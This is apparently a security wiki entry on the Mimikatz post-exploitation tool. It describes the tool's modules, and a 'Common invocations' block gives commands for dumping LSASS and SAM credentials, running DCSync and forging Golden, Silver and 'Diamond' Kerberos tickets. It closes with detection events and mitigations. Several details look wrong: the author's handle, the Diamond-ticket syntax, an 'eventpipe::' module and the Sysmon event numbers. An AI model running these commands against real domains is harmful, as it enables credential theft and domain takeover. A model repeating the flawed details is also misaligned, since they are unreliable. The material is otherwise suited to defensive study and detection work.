---
title: Mimikatz
type: entity
created: 2026-09-06
updated: 2026-09-06
tags: [tool, windows, post-exploitation, credential-access, kerberos]
---

# Mimikatz

**Mimikatz** (by Benjamin Delpy / g0tmi1) is the canonical Windows
post-exploitation Swiss-army knife: credential dumping ([[lsass]],
[[sam-database]], [[ntds-dit|NTDS]], [[dcsync]]), Kerberos ticket forging
([[golden-silver-tickets]], [[diamond-ticket]]), and a long tail of modules.
Where [[rubeus]] is the in-session Kerberos specialist, Mimikatz is the
broad dumper/forger — it **injects into LSASS** (the classic detection tell).

## Core modules

- `privilege::debug` — grab SeDebugPrivilege (needed for most dumping).
- `sekurlsa::logonpasswords` — dump all logons' NTLM/AES/plaintext from
  LSASS ([[lsass]]).
- `sekurlsa::tickets` / `sekurlsa::ptt` — list / inject Kerberos tickets
  ([[pass-the-hash-and-ticket|PtT]]).
- `sekurlsa::dump /analyze` — parse a saved LSASS dump.
- `lsadump::sam` — dump local accounts ([[sam-database]]).
- `lsadump::ntds` / `lsadump::dcsync` — dump the AD DB or DCSync
  ([[ntds-dit]], [[dcsync]]).
- `kerberos::golden` — forge a TGT (Golden) from the `krbtgt` key + SIDs
  ([[golden-silver-tickets]]); with a service key + `/service`, a Silver.
- `kerberos::list` / `kerberos::renew` / `kerberos::purge` — ticket mgmt.
- `dpapi::`, `eventpipe::`, `misc::` — DPAPI creds, event pipe, misc.

## Common invocations

```
# Dump credentials (needs SeDebug)
privilege::debug
sekurlsa::logonpasswords

# DCSync (remote, from a host with domain creds)
lsadump::dcsync /domain:corp.local /user:krbtgt /rpc
lsadump::dcsync /domain:corp.local /creds:CORP\user:pass /all

# Golden ticket (forge TGT from krbtgt AES256 key)
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... `
  /aes256:<krbtgt-aes256> /ptt
# Diamond ticket (AES128)
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... `
  /aes128:<krbtgt-aes128> /ptt

# Silver ticket (service account key + service)
kerberos::golden /user:attacker /domain:corp.local /sid:S-1-5-21-... `
  /service:cifs/target.corp.local /rc4:<service-rc4> /ptt

# SAM dump (local)
lsadump::sam
```

## Detection

- **Sysmon Event 10** — Mimikatz opens `lsass.exe` with `PROCESS_VM_READ`
  (`0x10`) — the highest-fidelity tell (it injects a COM+ /
  `MiniDumpWriteDump` thread into LSASS).
- **Event 4688** — command lines (`sekurlsa`, `lsadump`, `kerberos::golden`).
- **New threads in LSASS** (Sysmon 8 / 22) from an external image.
- **4662** (DCSync), **4768/4769** (forged tickets).
- Mitigations that blunt it: **Credential Guard** (VBS LSASS reads zeros),
  **LSASS PPL**, RunAs.

## Links

- [[lsass]], [[sam-database]], [[ntds-dit]] — the stores it dumps
- [[dcsync]] — its `lsadump::dcsync`
- [[golden-silver-tickets]], [[diamond-ticket]] — its `kerberos::golden`
- [[rubeus]] — the in-session Kerberos contrast
- [[ad-tiering-and-hardening]] — Credential Guard / PPL that stop it

## References

- [Mimikatz project](https://mimikatz-project.github.io/)
- [Mimikatz documentation](https://github.com/gentilkiwi/mimikatz)
- [ired.team: Mimikatz](https://www.ired.team/offensive-security-experiments/post-exploitation)
